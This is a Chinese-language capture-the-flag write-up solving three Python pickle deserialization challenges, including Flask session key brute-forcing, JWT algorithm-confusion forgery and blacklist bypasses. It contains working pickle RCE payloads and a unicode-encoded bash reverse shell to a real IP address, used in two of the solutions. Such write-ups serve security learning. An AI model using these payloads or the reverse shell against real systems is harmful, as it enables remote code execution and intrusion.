---
title: "三道pickle反序列化"
date: "2026-04-06T00:00:00+08:00"
lastmod: "2026-04-06T00:00:00+08:00"
slug: "PICKLE"
summary: "美团CTF2022-easypickle"
tags:
  - "Python"
  - "Pickle"
  - "反序列化"
params:
  protected: false
  commentId: "PICKLE"
  legacyId: "PICKLE"
---

# 美团CTF2022-easypickle

考点：pickle反序列化，V指令绕过字母

源码

```python
import base64
import pickle
from flask import Flask, session
import os
import random

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(2).hex()#随机生成4字符的字符串//jwt4key.py，然后利用生成的key字典在jwt-unsign进行爆破：一份字典不行就多份
@app.route('/')
def hello_world():
    if not session.get('user'):
        session['user'] = ''.join(random.choices("admin", k=5))
    return 'Hello {}!'.format(session['user'])
#session得是admin

@app.route('/admin')
def admin():
    if session.get('user') != "admin":
        return f"<script>alert('Access Denied');window.location.href='/'</script>"
    else:
        try:
            a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
            if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
                raise pickle.UnpicklingError("R i o b is forbidden")
            pickle.loads(base64.b64decode(session.get('ser_data')))#利用点前的过滤绕过，构造payload时不包含R i o b。可以利用这个大小写替换规则
            return "ok"
        except:
            return "error!"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

首先爆破jwt的sign

```python
import os
file_path='./key2.txt'
with open(file_path, 'w') as f:
    for i in range(1,99999):
        key = os.urandom(2).hex()
        f.write("\"{}\"\n".format(key))
```

在当前目录生成key2.txt，其中有99999个不同的4字符字符串

```shell
格式：
flask-unsign --unsign --cookie "xxx" --wordlist ""

flask-unsign --unsign --cookie "eyJ1c2VyIjoiYW5hZGQifQ.ac0SKw.zevd2W7NNraddZAnkV0xp0UcvPg" --wordlist "C:\Users\lilyzero207\Desktop\pickle\key2.txt"

得到4eed
```

伪造格式：

```shell
flask-unsign --sign --cookie "{'username':'admin','is_admin':True}" --secret 'your_secret_key'
```

pickle构造：

```python
try:
            a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
            if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
                raise pickle.UnpicklingError("R i o b is forbidden")
            pickle.loads(base64.b64decode(session.get('ser_data')))
```

session中存在ser_data,base64解码后会对其中一些内容进行替换，

如果还存在R i o b就waf

一个常规的构造：

```python
一个典中典的
import pickle
opcode=b'''(cos
system
S'whoami'
o.'
pickle.loads(opcode)
```

这里因为os会被识别并且置换为Os

cos不用变

最后的o.可以处理为os.绕过

无论命令执行还是反弹shell都会利用到其中的字母

于是想到V这个指令可以处理unicode编码

开新进程：

- **Syntax:** `bash -c 'command_string' [arg0 arg1 arg2 ...]`

bash -c "bash -i >& /dev/tcp/47.109.70.144/2333 0>&1"

将其

网站：https://www.mklab.cn/utils/unicode

编码，反弹shell

```python
import pickle
import base64

opcode= b"""(S'key1'
S'val1'
dS'vul'
(cos
system
V\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0034\u0037\u002e\u0031\u0030\u0039\u002e\u0037\u0030\u002e\u0031\u0034\u0034\u002f\u0032\u0033\u0033\u0033\u0020\u0030\u003e\u0026\u0031\u0022
os."""
print(base64.b64encode(opcode).decode())
```

最后：

```shell
flask-unsign --sign --cookie "{'user':'admin','ser_data':'KFMna2V5MScKUyd2YWwxJwpkUyd2dWwnCihjb3MKc3lzdGVtClZcdTAwNjJcdTAwNjFcdTAwNzNcdTAwNjhcdTAwMjBcdTAwMmRcdTAwNjNcdTAwMjBcdTAwMjJcdTAwNjJcdTAwNjFcdTAwNzNcdTAwNjhcdTAwMjBcdTAwMmRcdTAwNjlcdTAwMjBcdTAwM2VcdTAwMjZcdTAwMjBcdTAwMmZcdTAwNjRcdTAwNjVcdTAwNzZcdTAwMmZcdTAwNzRcdTAwNjNcdTAwNzBcdTAwMmZcdTAwMzRcdTAwMzdcdTAwMmVcdTAwMzFcdTAwMzBcdTAwMzlcdTAwMmVcdTAwMzdcdTAwMzBcdTAwMmVcdTAwMzFcdTAwMzRcdTAwMzRcdTAwMmZcdTAwMzJcdTAwMzNcdTAwMzNcdTAwMzNcdTAwMjBcdTAwMzBcdTAwM2VcdTAwMjZcdTAwMzFcdTAwMjIKb3Mu'}" --secret "4eed"
```

然后

```http
GET /admin HTTP/1.1
Host: 8888-c5518072-a0b6-48e6-8106-97a3e771208e.challenge.ctfplus.cn
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJyVkb0OgjAUhd-lsxPExU1JMNK0AypEFlO5JlILMQqp1vjuotySFHVw-nrPub_pnTSX_ZlMiICyqMiItNEWRC1aiYasEl4yZsucrm_gbVJ9jfTp-HpDqqugOMidz2juKwPzpA5UlsNqqrmMkGFHwzE-vMnkrGMZo85dva__t49ydS_BOBvk2z1tXYL9M9c37n7cuPUMfWYAdZxnQiTmGzXwwfU_6mKX_bwIyb_T3md-3G_7ywVt_60hjycxl7Wg.acz2nA.cnFiMRu6Pj6uK91H7f8-5MVfiHA
Connection: keep-alive
```

在vps弹到shell，命令执行即可

# 极客大挑战2024-jwt_pickle

考点：算法混淆攻击+pickle反序列化getshell

源码：

```python
import base64
import hashlib
import random
import string
from flask import Flask,request,render_template,redirect#??ssti
import jwt
import pickle

app = Flask(__name__,static_folder="static",template_folder="templates")

privateKey=open("./private.pem","rb").read()
publicKey=open("./public.pem","rb").read()
characters = string.ascii_letters + string.digits + string.punctuation
adminPassword = ''.join(random.choice(characters) for i in range(18))#随机的18字符串，往后看
user_list={"admin":adminPassword}

@app.route("/register",methods=["GET","POST"])
def register():
    if request.method=="GET":
        return render_template("register.html")
    elif request.method=="POST":
        username=request.form.get("username")
        password=request.form.get("password")
        if (username==None)|(password==None)|(username in user_list):
            return "error"

        user_list[username]=password
        return "OK"
#注册获取用户

@app.route("/login",methods=["GET","POST"])
def login():
    if request.method=="GET":
        return render_template("login.html")
    elif request.method=="POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if (username == None) | (password == None):
            return "error"

        if username not in user_list:
            return "please register first"

        if user_list[username] !=password:
            return "your password is not right"

        ss={"username":username,"password":hashlib.md5(password.encode()).hexdigest(),"is_admin":False}
        if username=="admin":
            ss["is_admin"]=True
            #此处可知密码即用户名的md5值，因为admin的密码难求，往后看
            ss.update(introduction=base64.b64encode(pickle.dumps("1ou_Kn0w_80w_to_b3c0m3_4dm1n?")).decode())
		#introduction需要传入base64数据
        token=jwt.encode(ss,privateKey,algorithm='RS256')
	#每个用户注册登录后得到一个rs256加密的token
        return "OK",200,{"Set-Cookie":"Token="+token.decode()}


@app.route("/admin",methods=["GET"])
def admin():
    token=request.headers.get("Cookie")[6:]
    print(token)
    if token ==None:
        redirect("login")
    try:
        real= jwt.decode(token, publicKey, algorithms=['HS256', 'RS256'])###hs256，rs256，混淆算法
    except Exception as e:
        print(e)
        return "error"
    username = real["username"]
    password = real["password"]
    is_admin = real["is_admin"]
    if password != hashlib.md5(user_list[username].encode()).hexdigest():
        return "Hacker!"

    if is_admin:
        serial_S = base64.b64decode(real["introduction"])
        introduction=pickle.loads(serial_S)             #####
        return f"Welcome!!!,{username},introduction: {introduction}"
    else:
        return f"{username},you don't have enough permission in here"

@app.route("/",methods=["GET"])
def jump():
    return redirect("login")

if __name__ == "__main__":
    app.run(debug=False,host="0.0.0.0",port=80)
```

首先注册两个用户得到2个不同token

```
2
2
Token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOmZhbHNlfQ.NrXDYdIIjIapYljl7OzLBkjhGU4AKhiI9eG7KuHEbXgcs1ol8mkLEJNrnU6xNhlHUaM6UoazW3z8xzsntyIxopHDvKsw8KJ5Rd_cYNNpAKmPCjmmDWCy0ncGHh_mFRgUxB5uS6S3UcRv6-dZ1Ymrr7D78BHAe9TgNjGxhUyCH6WCLkAo3DUS-tDMC7vMjUdVyipjevKIke4qQg2YlJuRbYVo9-Hd_V_TJL28As4NiXDN38beON7cer7KSfHQQCQ9rateXOQb7cWe--iYJOGAEOCziNo9zVjajiux3gwSHblDcsvKo26P2ZCh02b49tgzKP_VSDouCJ4wDUrty5mKUg
1
1
Token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwiaXNfYWRtaW4iOmZhbHNlfQ.HLlGFnJcGt-C6_CCHh9FteC4BatbInaFpoGH1oDHKCYI6TT-b9wX4XKUQLxpNOo2qV0j8_WRbdah4fbLgAcXFVhayKApvnmBUV8v0jl1kN-aRCaP6dN-Awin9P5plOPYVGujLxCJn2iBxpG-f-W7_j9lNKF2LRo30rI2qyA4svz3KMPTMLwFPoVCSRd8sErf7-vRseoSBWWHL_yilj0LZ8e91ngzdcSXjkGskLQYcodsYL2EQ63ZWfLCxSXLmfO_w_VFmjr-BjjQ8xtEAbtRKeIv4Luuc8phMS1n5x-bIyHL4PhbZBlTw8XzM1chdR2tJZv7-lf9YPhvwhCnnXGhXw
```

然后利用：https://carsaid.github.io/burpsuite-learn/wsa/advanced/jwt/algorithm-confusion/#%E4%BB%8E%E7%8E%B0%E6%9C%89%E4%BB%A4%E7%89%8C%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%85%AC%E9%92%A5

从已知的令牌中得到公钥：

```shell
kali运行：

语法：docker run --rm -it portswigger/sig2n <token1> <token2>

(base) ┌──(root㉿kali)-[~/Desktop]
└─# docker run --rm -it portswigger/sig2n eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOmZhbHNlfQ.NrXDYdIIjIapYljl7OzLBkjhGU4AKhiI9eG7KuHEbXgcs1ol8mkLEJNrnU6xNhlHUaM6UoazW3z8xzsntyIxopHDvKsw8KJ5Rd_cYNNpAKmPCjmmDWCy0ncGHh_mFRgUxB5uS6S3UcRv6-dZ1Ymrr7D78BHAe9TgNjGxhUyCH6WCLkAo3DUS-tDMC7vMjUdVyipjevKIke4qQg2YlJuRbYVo9-Hd_V_TJL28As4NiXDN38beON7cer7KSfHQQCQ9rateXOQb7cWe--iYJOGAEOCziNo9zVjajiux3gwSHblDcsvKo26P2ZCh02b49tgzKP_VSDouCJ4wDUrty5mKUg eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwiaXNfYWRtaW4iOmZhbHNlfQ.HLlGFnJcGt-C6_CCHh9FteC4BatbInaFpoGH1oDHKCYI6TT-b9wX4XKUQLxpNOo2qV0j8_WRbdah4fbLgAcXFVhayKApvnmBUV8v0jl1kN-aRCaP6dN-Awin9P5plOPYVGujLxCJn2iBxpG-f-W7_j9lNKF2LRo30rI2qyA4svz3KMPTMLwFPoVCSRd8sErf7-vRseoSBWWHL_yilj0LZ8e91ngzdcSXjkGskLQYcodsYL2EQ63ZWfLCxSXLmfO_w_VFmjr-BjjQ8xtEAbtRKeIv4Luuc8phMS1n5x-bIyHL4PhbZBlTw8XzM1chdR2tJZv7-lf9YPhvwhCnnXGhXw


得到：
返回
ound n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxQXNwK1RiTStMK0lqb2todGFkWgovSUpRUzhJYVVxM281MEUwa2dVYjhsQ0RzNUFBTWU3ZDNlNUpaT2o1RUIvdW1HWDVTN1FlVDFmc2NQRFY1V1pSCkd0aUJyUzVNSDE3bDR2TzgxYmNmM1RGMmZYdi9nZWtETk05NExiYUkvMC9OQmFyenRaZEpMKzdrejVEMXdGUDIKazZ5N2Y5SzUrYmVPYVdYb0N1RlYyazZXbkwvRXpZR3NOb2NSQnI5RHBjQkRvdUFUbS9tSVZLUTlqNnJGSXJCMwplV2U3WVN2ZDVXOUpxVDVXREZjL2NQUmdwcnZNSFBrYTBMeHQ1TFBPb3JBTDFTOXNnZHhRSUhzcWNRSXdSSEVUCmlxZUxZWktDR2hpMU16NVBjUW8wU2tNaWd2QXF4SUFCYWF3MzhTNVdnU0xqdTlUVzJHREF1b2tqMFdxOGFRUGUKVndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICIyIiwgInBhc3N3b3JkIjogImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwgImlzX2FkbWluIjogZmFsc2UsICJleHAiOiAxNzc1MTI4NDUyfQ.0u0yotWbawhPFb_4xIyKpij11SlSC_nprPCZEx0YEDE
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFBc3ArVGJNK0wrSWpva2h0YWRaL0lKUVM4SWFVcTNvNTBFMGtnVWI4bENEczVBQU1lN2QKM2U1SlpPajVFQi91bUdYNVM3UWVUMWZzY1BEVjVXWlJHdGlCclM1TUgxN2w0dk84MWJjZjNURjJmWHYvZ2VrRApOTTk0TGJhSS8wL05CYXJ6dFpkSkwrN2t6NUQxd0ZQMms2eTdmOUs1K2JlT2FXWG9DdUZWMms2V25ML0V6WUdzCk5vY1JCcjlEcGNCRG91QVRtL21JVktROWo2ckZJckIzZVdlN1lTdmQ1VzlKcVQ1V0RGYy9jUFJncHJ2TUhQa2EKMEx4dDVMUE9vckFMMVM5c2dkeFFJSHNxY1FJd1JIRVRpcWVMWVpLQ0doaTFNejVQY1FvMFNrTWlndkFxeElBQgphYXczOFM1V2dTTGp1OVRXMkdEQXVva2owV3E4YVFQZVZ3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICIyIiwgInBhc3N3b3JkIjogImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwgImlzX2FkbWluIjogZmFsc2UsICJleHAiOiAxNzc1MTI4NDUyfQ.xAFeFOTCUGtnYB2lP72bdERt_YG6qnVnGwOOviIybGI

```

随后尝试这两个生成的临时token

第一个返回error

第二个返回2,you don't have enough permission in here

说明pkcs1 key密钥可利用

于是用这个构造：

```json
{
  "username": "2",
  "password": "c81e728d9d4c2f636f067f89cc14862c",
  "is_admin": true,
  "exp": 1775128452,
  "introduction":"gASVUgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw2X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgplIWUUpQu"
}
```

注意：sign勾选上base64可利用，

此处introduction的构造：

典中典的rce构造

```python
import base64
import pickle
class shell:
    def __reduce__(self):
        return (eval, ("__import__('os').popen(request.args.get('cmd')).read()",))
shell = shell()
data = pickle.dumps(shell)
print(base64.b64encode(data).decode())
```

然后在bp

```http
GET /admin?cmd=cat%20/flag HTTP/1.1
Host: 80-df1fc38f-681c-46d1-a888-7a49c6fc1505.challenge.ctfplus.cn
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTc3NTEyODQ1MiwiaW50cm9kdWN0aW9uIjoiZ0FTVlVnQUFBQUFBQUFDTUNHSjFhV3gwYVc1emxJd0VaWFpoYkpTVGxJdzJYMTlwYlhCdmNuUmZYeWduYjNNbktTNXdiM0JsYmloeVpYRjFaWE4wTG1GeVozTXVaMlYwS0NkamJXUW5LU2t1Y21WaFpDZ3BsSVdVVXBRdSJ9.zkr375V-43O6u8eSnBQ1PSsf_J2BEBc3zGzhEndOyhs
referer: http://80-df1fc38f-681c-46d1-a888-7a49c6fc1505.challenge.ctfplus.cn/login
Connection: keep-alive
```

得到flag

```
Welcome!!!,2,introduction: SYC{3f7cf3eb-8963-4e11-80fb-832f22647add}
```

# 0X25马哈鱼商店

考点：信息搜集，绕过b''

抓包买pickle

```http
pid=8&discount=0.000001
Location: /shop_success
Server: Werkzeug/3.1.3 Python/3.12.11
Set-Cookie: session=.eJyrVgrITM7OSY13zy9RsiopKk3VUUrLSUyPTwfx0xJzioECOYnFJfFJpZVKVlDVSjpKpcWpRUC-oVItAB71Fpc.ac5knw.oF6C18o4QmDd7QMAsmADDMeTnnE; HttpOnly; Path=/
Vary: Cookie
```



```
Success!
You have purchased: Pickle

Wow! Now You Can Really Click Here To GetFlag.

You Money Now: 9998.99999

Continue Shopping
```

点击here

```python
    Use GET To Send Your Loved Data!!!      
    BlackList = [b'', b'']#过滤b指令      
    @app.route('/pickle_dsa')
    def pic():
        data = request.args.get('data')
        if not data:
            return "Use GET To Send Your Loved Data"
        try:
            data = base64.b64decode(data)
        except Exception:
            return "Cao!!!"
        for b in BlackList:
            if b in data:
                return "卡了"  #不能有b
        p = pickle.loads(data)
        print(p)
        return f"<p>Vamos! {p}<p>
```

没看出来拦截的什么，问问

```
核心拦截对象：b'' 和 b'\x1e'
在 pickle 的底层指令集（Protocols）中，这两个字节码具有特殊含义：

b'' (空字节 / STOP 指令): 实际上，这里的 b'' 在代码逻辑中很难被触发（因为它是空字符串），但如果黑名单指的是十六进制的 \x00，它通常用于某些协议的版本标识或数据截断。

b'\x1e' (即 \x1e / PROTO 指令):
这是 pickle 协议版本声明的指令。在 Python 3 中，默认生成的 pickle 数据通常会以 \x80（Protocol 标识）开头，紧接着就是版本号。\x1e 在较新版本的 pickle 协议中用于更复杂的内存管理或数据段。
```

拦截单字节 0x1E

#### 解法1：同easypickle

```python
import base64
 
opcode=b'''(S'key1'
S'val1'
dS'vul'
(cbuiltins
eval
S'__import__(\'os\').system(\'cat /proc/self/environ\')'
o.'''
print(base64.b64encode(opcode).decode())
```

虽然没有出现“卡了”，但是这里只有一个：<p>Vamos! 0<p>

于是尝试反弹shell

运用反弹shell成功：

```python
import pickle
import base64

opcode= b"""(S'key1'
S'val1'
dS'vul'
(cos
system
V\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0034\u0037\u002e\u0031\u0030\u0039\u002e\u0037\u0030\u002e\u0031\u0034\u0034\u002f\u0032\u0033\u0033\u0033\u0020\u0030\u003e\u0026\u0031\u0022
os."""
print(base64.b64encode(opcode).decode())
```

然后监听弹到shell

命令执行cat /proc/self/environ

```
0xGame{You_Have_Learned_How_to_Buy_Pickle!}
```

#### 解法2：

利用文本字节绕过单字节

单字节：

使用protocol=0
protocol=0 是文本协议，基本不会包含0x1E
protocol=2,3 是二进制协议，会包含各种控制字符，容易触发 0x1E 检测

```python
import pickle
import base64  

class rce(object):
    def __reduce__(self):
        return (eval, ("__import__('os').popen('env').read()",))

shell = (pickle.dumps(rce(), protocol=0))
base64_shell = base64.b64encode(shell)
print(base64_shell.decode())
```

#### 解法3：*

说实话没看懂：

```
题目使用pickle.loads()反序列化用户提供的数据，存在反序列化RCE漏洞：

data = base64.b64decode(data)

for b in BlackList:

    if b in data:

        return "卡了"

p = pickle.loads(data)

关键技术

1. 使用STACK_GLOBAL绕过黑名单

我们使用pickle protocol 4的STACK_GLOBAL (opcode 0x93)：

b'\x80\x04'  # PROTO 4

b'\x8c\nsubprocess'  # SHORT_BINUNICODE 'subprocess'

b'\x8c\tgetoutput'   # SHORT_BINUNICODE 'getoutput'

b'\x93'              # STACK_GLOBAL - 从栈获取subprocess.getoutput

2. 使用subprocess.getoutput获取输出

os.system()只返回退出码，无法看到输出。使用subprocess.getoutput()可以获取命令的输出内容。

解题步骤

构造payload: 使用STACK_GLOBAL opcode构造pickle字节码

选择合适的函数: 使用subprocess.getoutput()而非os.system()

查找flag位置: 通过env | grep -i flag发现flag在环境变量中

payload = (

    b'\x80\x04'  # PROTO 4

    b'\x8c\nsubprocess'  # SHORT_BINUNICODE 'subprocess' (长度10)

    b'\x8c\tgetoutput'   # SHORT_BINUNICODE 'getoutput' (长度9)

    b'\x93'              # STACK_GLOBAL

    b'\x8c\x12env | grep -i flag'  # 命令 (长度0x12=18)

    b'\x85'              # TUPLE1

    b'R'                 # REDUCE (执行函数)

    b'.'                 # STOP

)
```
